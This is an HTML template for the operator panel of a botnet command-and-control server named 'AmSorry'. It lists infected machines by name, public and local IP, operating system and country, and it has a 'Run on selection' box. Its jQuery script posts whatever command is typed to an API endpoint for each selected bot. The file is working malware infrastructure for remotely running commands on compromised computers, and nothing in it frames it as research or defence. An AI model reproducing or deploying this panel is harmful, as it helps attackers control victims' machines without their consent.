<!DOCTYPE html>

<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <link rel="stylesheet" type="text/css" href="../static/css/stylesheet.css" media="screen">
    <link rel="stylesheet" type="text/css" href="../static/css/github-dark.css" media="screen">
    <link rel="shortcut icon" type="image/x-icon" href="static/images/AmSorry_icon.ico">
    <title>AmSorry</title>
  </head>

  <body>

  <body>
    <header class="menu-header">
      <div class="container">
        <div class="div-left-header">
          <h1>Bots list</h1>
        </div>
        <div class="div-right-header">  
          <a href="../" class="btn btn-header">Back to the menu</a>
          <a href="../disconnect" class="btn btn-header">Disconnect</a>
        </div>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <br>
        <label for="cmd" class="label-password">Run on selection :</label>
        <input type="text" name="cmd" id="cmd" onkeypress="keypressed(event)"  class="form-control inputField-list">
        <button type="submit" onclick="send_command()" class="btn btn-send">Send</button>
        <br><br><br><br>
        <table>
          <thead>
            <tr>
              <th>Name</th>
              <th>Last Online</th>
              <th>IP</th>
              <th>IP Local</th>
              <th>OS</th>
              <th>Country</th>
              <th>Sel.</th>
	      <th></th>
            </tr>
          </thead>
          <tbody>
            <!--{{BOT_TABLE}}-->
          </tbody>
        </table>
      </section>
    </div>

    <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
    <script>
    function keypressed(e){
        if(e.keyCode === 13){
            send_command();
        }
        return false;
    }
    function send_command(e) {
        if(!$(".botid:checked").length){
          alert('Please select at least one bot !');
          return;
        }
        $(".botid:checked").each(function(){
            $.post("../api/push", {'botid': $(this).attr('id'), 'cmd': $('#cmd').val()});
        });
        $('#cmd').val('');
        return false;
    }
    </script>
  </body>
</html>
